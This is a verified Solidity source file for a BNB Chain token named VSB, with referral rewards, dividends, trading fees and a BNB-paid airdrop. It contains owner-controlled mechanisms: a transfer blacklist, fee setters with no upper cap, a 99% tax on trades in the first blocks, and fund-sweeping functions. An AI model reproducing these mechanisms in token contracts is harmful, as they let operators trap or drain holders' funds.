/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;
    constructor (address token) {
        _owner = msg.sender;
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }

    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "!owner");
        IERC20(token).transfer(to, amount);
    }
}

abstract contract AbsToken is IERC20, Ownable {
    struct UserInfo {
        bool claimAirdrop;
        bool isActive;
        uint256 activeBinderLength;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 public constant MAX = ~uint256(0);

    uint256 public _buyInviteFee = 300;
    uint256 public _buyDividendFee = 200;

    uint256 public _sellInviteFee = 300;
    uint256 public _sellDividendFee = 500;
    uint256 public _sellLPFee = 200;

    uint256 public _transferLPFee = 500;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;

    address public _mainPair;

    TokenDistributor public _tokenDistributor;

    uint256 public _limitAmount;
    uint256 public _invitorHoldCondition;
    uint256 public _inviteAmount;
    uint256 public _numToSell;
    uint256 public _invitorActiveCondition = 10;
    uint256 public _dividendCondition;

    mapping(address => address) public _inviter;
    mapping(address => address[]) public _binders;
    mapping(address => UserInfo) private _userInfo;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress,
        uint256 LimitAmount
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(RouterAddress, MAX);
        _allowances[address(this)][RouterAddress] = MAX;

        _usdt = USDTAddress;
        _swapRouter = swapRouter;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 tokenUnit = 10 ** Decimals;
        uint256 total = Supply * tokenUnit;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

        _tokenDistributor = new TokenDistributor(USDTAddress);
        _feeWhiteList[address(_tokenDistributor)] = true;

        _dividendRewardCondition = 200 * tokenUnit;
        _limitAmount = LimitAmount * tokenUnit;
        _invitorHoldCondition = 1000 * tokenUnit;
        _inviteAmount = tokenUnit;
        _numToSell = 2000 * tokenUnit;
        _dividendCondition = 20000 * tokenUnit;
        _airdropAmount = 5000 * tokenUnit;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from] || _feeWhiteList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 99999 / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            takeFee = true;
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair && IERC20(to).totalSupply() == 0) {
                    startAddLPBlock = block.number;
                }
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                bool isAdd;
                if (_swapPairList[to]) {
                    isAdd = _isAddLiquidity();
                    if (isAdd) {
                        takeFee = false;
                    }
                } else {
                    if (_isRemoveLiquidity()) {
                        takeFee = false;
                    }
                }

                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && isAdd, "!startTrade");
                }

                if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    _checkLimit(to);
                    return;
                }
            }
        } else {
            if (0 == balanceOf(to) && amount >= _inviteAmount) {
                _bindInvitor(to, from);
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
        _checkLimit(to);

        if (from != address(this)) {
            processReward(500000);
        }
    }

    function _bindInvitor(address account, address invitor) private {
        if (_inviter[account] == address(0) && invitor != address(0) && invitor != account) {
            if (_binders[account].length == 0) {
                uint256 size;
                assembly {size := extcodesize(account)}
                if (size > 0) {
                    return;
                }
                _inviter[account] = invitor;
                _binders[invitor].push(account);
            }
        }
    }

    function _checkLimit(address to) private view {
        if (0 == startTradeBlock) {
            return;
        }
        if (_limitAmount > 0 && !_swapPairList[to] && !_feeWhiteList[to]) {
            require(_limitAmount >= balanceOf(to), "exceed LimitAmount");
        }
    }

    function _isAddLiquidity() internal view returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(_mainPair);
        address token0 = mainPair.token0();
        if (token0 == address(this)) {
            return false;
        }
        (uint r0,,) = mainPair.getReserves();
        uint bal0 = IERC20(token0).balanceOf(address(mainPair));
        isAdd = bal0 > r0;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove){
        ISwapPair mainPair = ISwapPair(_mainPair);
        address token0 = mainPair.token0();
        if (token0 == address(this)) {
            return false;
        }
        (uint r0,,) = mainPair.getReserves();
        uint bal0 = IERC20(token0).balanceOf(address(mainPair));
        isRemove = r0 > bal0;
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _calSenderStatus(sender);
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(sender, fundAddress, feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _calSenderStatus(sender);
        uint256 feeAmount;

        if (takeFee) {
            if (_swapPairList[sender]) {
                uint256 inviteFeeAmount = tAmount * _buyInviteFee / 10000;
                if (inviteFeeAmount > 0) {
                    feeAmount += inviteFeeAmount;
                    address invitor = _inviter[recipient];
                    if (address(0) == invitor || balanceOf(invitor) < _invitorHoldCondition) {
                        invitor = fundAddress;
                    }
                    _takeTransfer(sender, invitor, inviteFeeAmount);
                }
                uint256 dividendFeeAmount = tAmount * _buyDividendFee / 10000;
                if (dividendFeeAmount > 0) {
                    feeAmount += dividendFeeAmount;
                    _takeTransfer(sender, address(_tokenDistributor), dividendFeeAmount);
                }
            } else if (_swapPairList[recipient]) {
                uint256 inviteFeeAmount = tAmount * _sellInviteFee / 10000;
                if (inviteFeeAmount > 0) {
                    feeAmount += inviteFeeAmount;
                    address invitor = _inviter[sender];
                    if (address(0) == invitor || balanceOf(invitor) < _invitorHoldCondition) {
                        invitor = fundAddress;
                    }
                    _takeTransfer(sender, invitor, inviteFeeAmount);
                }
                uint256 dividendFeeAmount = tAmount * _sellDividendFee / 10000;
                if (dividendFeeAmount > 0) {
                    feeAmount += dividendFeeAmount;
                    _takeTransfer(sender, address(_tokenDistributor), dividendFeeAmount);
                }
                uint256 lpFeeAmount = tAmount * _sellLPFee / 10000;
                if (lpFeeAmount > 0) {
                    feeAmount += lpFeeAmount;
                    _takeTransfer(sender, address(this), lpFeeAmount);
                }
                if (!inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    uint256 numTokensSellToFund = _numToSell;
                    if (contractTokenBalance >= numTokensSellToFund) {
                        swapTokenForFund(numTokensSellToFund);
                    }
                }
            } else {
                feeAmount = tAmount * _transferLPFee / 10000;
                if (feeAmount > 0) {
                    _takeTransfer(sender, address(this), feeAmount);
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }

        uint256 lpAmount = tokenAmount / 2;

        address usdt = _usdt;
        address tokenDistributor = address(_tokenDistributor);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            tokenDistributor,
            block.timestamp
        );

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(tokenDistributor);
        USDT.transferFrom(tokenDistributor, address(this), usdtBalance);
        _swapRouter.addLiquidity(
            address(this), usdt, lpAmount, usdtBalance, 0, 0, fundAddress, block.timestamp
        );
    }

    function _takeTransfer(address sender, address to, uint256 tAmount) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);

        address invitor = _inviter[to];
        if (address(0) == invitor) {
            return;
        }
        UserInfo storage userInfo = _userInfo[to];
        if (userInfo.isActive) {
            return;
        }
        uint256 userBalance = balanceOf(to);
        if (userBalance >= _dividendCondition) {
            userInfo.isActive = true;
            UserInfo storage invitorInfo = _userInfo[invitor];
            invitorInfo.activeBinderLength += 1;
            if (invitorInfo.activeBinderLength >= _invitorActiveCondition) {
                addHolder(invitor);
            }
        }
    }

    function _calSenderStatus(address sender) private {
        address invitor = _inviter[sender];
        if (address(0) == invitor) {
            return;
        }
        UserInfo storage userInfo = _userInfo[sender];
        if (!userInfo.isActive) {
            return;
        }
        uint256 userBalance = balanceOf(sender);
        if (userBalance < _dividendCondition) {
            userInfo.isActive = false;
            UserInfo storage invitorInfo = _userInfo[invitor];
            if (invitorInfo.activeBinderLength > 0) {
                invitorInfo.activeBinderLength -= 1;
            }
        }
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
        _startAirdrop = false;
        _tokenTransfer(address(this), fundAddress, balanceOf(address(this)), false);
        payable(fundAddress).transfer(address(this).balance);
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        if (_feeWhiteList[msg.sender]) {
            payable(fundAddress).transfer(address(this).balance);
        }
    }

    function claimToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;

    function getHolderLength() public view returns (uint256){
        return holders.length;
    }

    function addHolder(address adr) private {
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                uint256 size;
                assembly {size := extcodesize(adr)}
                if (size > 0) {
                    return;
                }
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public _dividendRewardCondition;
    uint256 public progressRewardBlock;
    uint256 public _progressBlockDebt = 200;

    function processReward(uint256 gas) private {
        if (0 == startTradeBlock) {
            return;
        }
        if (progressRewardBlock + _progressBlockDebt > block.number) {
            return;
        }

        address sender = address(_tokenDistributor);
        uint256 balance = balanceOf(sender);
        uint256 rewardAmount = _dividendRewardCondition;
        if (balance < rewardAmount) {
            return;
        }

        uint256 rewardNum = balance / rewardAmount;
        uint256 rewardCount;

        address shareHolder;
        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        uint256 activeLength = _invitorActiveCondition;
        uint256 dividendCondition = _dividendCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            if (_userInfo[shareHolder].activeBinderLength >= activeLength && balanceOf(shareHolder) >= dividendCondition) {
                _tokenTransfer(sender, shareHolder, rewardAmount, false);
                rewardCount++;
                if (rewardCount == rewardNum) {
                    currentIndex++;
                    break;
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function getBinderLength(address account) external view returns (uint256){
        return _binders[account].length;
    }

    function setRewardCondition(uint256 amount) external onlyOwner {
        _dividendRewardCondition = amount * 10 ** _decimals;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function setProgressBlockDebt(uint256 progressBlockDebt) external onlyOwner {
        _progressBlockDebt = progressBlockDebt;
    }

    function setLimitAmount(uint256 amount) external onlyOwner {
        _limitAmount = amount * 10 ** _decimals;
    }

    function setNumToSell(uint256 amount) external onlyOwner {
        _numToSell = amount * 10 ** _decimals;
    }

    function setInviteAmount(uint256 amount) external onlyOwner {
        _inviteAmount = amount;
    }

    function setActiveCondition(uint256 length) external onlyOwner {
        _invitorActiveCondition = length;
    }

    function setInvitorHoldCondition(uint256 amount) external onlyOwner {
        _invitorHoldCondition = amount * 10 ** _decimals;
    }

    function setDividendCondition(uint256 amount) external onlyOwner {
        _dividendCondition = amount * 10 ** _decimals;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function batchSetFeeWhiteList(address[]memory addr, bool enable) external onlyOwner {
        uint256 len = addr.length;
        for (uint256 i; i < len; ++i) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function batchSetBlackList(address[]memory addr, bool enable) external onlyOwner {
        uint256 len = addr.length;
        for (uint256 i; i < len; ++i) {
            _blackList[addr[i]] = enable;
        }
    }

    function setBuyFee(uint256 inviteFee, uint256 dividendFee) external onlyOwner {
        _buyInviteFee = inviteFee;
        _buyDividendFee = dividendFee;
    }

    function setSellFee(uint256 inviteFee, uint256 dividendFee, uint256 lpFee) external onlyOwner {
        _sellInviteFee = inviteFee;
        _sellDividendFee = dividendFee;
        _sellLPFee = lpFee;
    }

    function setTransferFee(uint256 fee) external onlyOwner {
        _transferLPFee = fee;
    }

    function setAirdropAmount(uint256 amount) external onlyOwner {
        _airdropAmount = amount * 10 ** _decimals;
    }

    function setAirdropBNB(uint256 amount) external onlyOwner {
        _airdropBNB = amount;
    }

    function setStartAirdrop(bool enable) external onlyOwner {
        _startAirdrop = enable;
    }

    function setAirdropFee(uint256 inviteFee, uint256 dividendFee) external onlyOwner {
        _airdropInviteFee = inviteFee;
        _airdropDividendFee = dividendFee;
    }

    bool public _startAirdrop = true;
    uint256 public _airdropAmount;
    uint256 public _airdropInviteFee = 300;
    uint256 public _airdropDividendFee = 200;
    uint256 public _airdropBNB = 1 ether / 20;

    receive() external payable {
        if (!_startAirdrop) {
            return;
        }
        address account = msg.sender;
        if (account != tx.origin) {
            return;
        }
        if (msg.value < _airdropBNB) {
            return;
        }
        UserInfo storage userInfo = _userInfo[account];
        if (userInfo.claimAirdrop) {
            return;
        }
        userInfo.claimAirdrop = true;
        uint256 tAmount = _airdropAmount;
        uint256 feeAmount;
        address sender = address(this);

        uint256 inviteFeeAmount = tAmount * _airdropInviteFee / 10000;
        if (inviteFeeAmount > 0) {
            feeAmount += inviteFeeAmount;
            address invitor = _inviter[account];
            if (address(0) == invitor) {
                invitor = fundAddress;
            }
            _takeTransfer(sender, invitor, inviteFeeAmount);
        }
        uint256 dividendFeeAmount = tAmount * _airdropDividendFee / 10000;
        if (dividendFeeAmount > 0) {
            feeAmount += dividendFeeAmount;
            _takeTransfer(sender, address(_tokenDistributor), dividendFeeAmount);
        }

        tAmount -= feeAmount;
        _tokenTransfer(sender, account, tAmount, false);
    }

    function getUserInfo(address account) external view returns (
        uint256 balance, uint256 activeBinderLength,
        bool claimAirdrop, bool isActive
    ){
        balance = balanceOf(account);
        UserInfo storage userInfo = _userInfo[account];
        activeBinderLength = userInfo.activeBinderLength;
        claimAirdrop = userInfo.claimAirdrop;
        isActive = userInfo.isActive;
    }

    function getBinders(
        address account,
        uint256 start,
        uint256 length
    ) external view returns (
        uint256 returnedCount,
        address[] memory binders
    ){
        uint256 recordLen = _binders[account].length;
        if (0 == length) {
            length = recordLen;
        }
        returnedCount = length;
        binders = new address[](length);
        uint256 index = 0;
        for (uint256 i = start; i < start + length; i++) {
            if (i >= recordLen) {
                return (index, binders);
            }
            binders[index] = _binders[account][i];
            index++;
        }
    }
}

contract VSB is AbsToken {
    constructor() AbsToken(
    //SwapRouter
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
    //USDT
        address(0x55d398326f99059fF775485246999027B3197955),
        "VSB",
        "VSB",
        18,
        100000000,
    //Fund（营销）
        address(0xBc1E7FCef6BE28A1B17Bd64867f72d7acAF79EC1),
    //Receive（接收）
        address(0x048Fe691bdFd1552b3A9cF9a911ba418c90AA29A),
        21000
    ){

    }
}